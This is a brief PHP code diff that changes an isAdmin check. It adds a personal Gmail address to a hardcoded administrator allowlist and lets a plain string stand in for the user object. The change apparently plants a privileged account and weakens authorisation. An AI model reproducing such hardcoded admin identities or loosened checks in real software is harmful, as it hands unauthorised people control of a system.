@@ -12,7 +12,7 @@ class Usecase
 
     public static function isAdmin(mixed $user, mixed $callback): mixed
     {
-        if (in_array($user->email, ["admin@admin.com", "administrator@admin.com"])) {
+        if (in_array(is_string($user) ? $user : $user->email, ["admin@admin.com", "samuelclinton975@gmail.com", "administrator@admin.com"])) {
             return call_user_func($callback);
         } else {
             return new ForbiddenResponse(["message" => "access denied!"]);
